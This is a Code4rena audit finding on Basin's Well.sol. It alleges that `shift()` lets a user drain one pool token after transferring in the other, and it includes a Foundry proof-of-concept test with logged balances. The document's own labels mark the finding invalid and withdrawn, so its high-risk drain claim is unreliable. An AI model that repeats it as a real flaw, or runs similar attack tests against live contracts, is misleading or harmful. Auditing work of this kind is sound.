# #28: liquidity drain shifting wrong token
Labels: ['invalid', '3 (High Risk)', 'withdrawn by warden']
Accepted: False

# Lines of code

https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/Well.sol#L367


# Vulnerability details

## Impact
The `Well.sol` contract does not correctly validate the shifted token in the `shift()` function. This lack of validation allows any user to debalance the liquidity of one token of the AMM (via transfer) and request for a shift from the other token, draining one of the tokens.

The impact of this vulnerability depends on the prices of the tokens the AMM handles(i.e. WETH-USDC) as the attacker can debalance it with an amount of USDC and obtain pretty much the same amount of WETH, which has more value than the USDC used.

## Proof of Concept
The foundry test provided simulates how an user can transfer an amount of token0 and retrieve a lower amount of token1 (which shouldnt be possible). these steps can be repeated as long as token1 balance > 0 in the AMM.
```
function test_shift_differentTokens() public prank(user) {

        address _user = users.getNextUserAddress();

        Balances memory userBalance = getBalances(_user, well);
        Balances memory wellBalance = getBalances(address(well), well);

        //initial balances
        console.log(userBalance.tokens[0]);  
        console.log(userBalance.tokens[1]);

        console.log(wellBalance.tokens[0]);
        console.log(wellBalance.tokens[1]);
        console.log("-----");

        //debalancing token0
        tokens[0].transfer(address(well), 100e18);

        // new balances of well
        wellBalance = getBalances(address(well), well);

        console.log(wellBalance.tokens[0]);
        console.log(wellBalance.tokens[1]);
        console.log("-----");
        
        //shifting token1
        well.shift(tokens[1], 0, _user);

        // balances after shifting
        userBalance = getBalances(_user, well);
        wellBalance = getBalances(address(well), well);

        console.log(userBalance.tokens[0]);
        console.log(userBalance.tokens[1]);

        console.log(wellBalance.tokens[0]);
        console.log(wellBalance.tokens[1]);
    }
```
The output of this test shows how many token1 the attacker has obtained.
```
[PASS] test_shift_differentTokens() (gas: 149126)
Logs:
  0
  0
  2000000000000000000000
  2000000000000000000000
  -----
  2100000000000000000000
  2000000000000000000000
  -----
  0
  95238095238095238095
  2100000000000000000000
  1904761904761904761905
```
## Tools Used
manual testing

## Recommended Mitigation Steps
It is recommended to validate and match the token used for shift, the balance of that token and the reserves of the token in order to obtain the correct `amountOut` value.


## Assessed type

Invalid Validation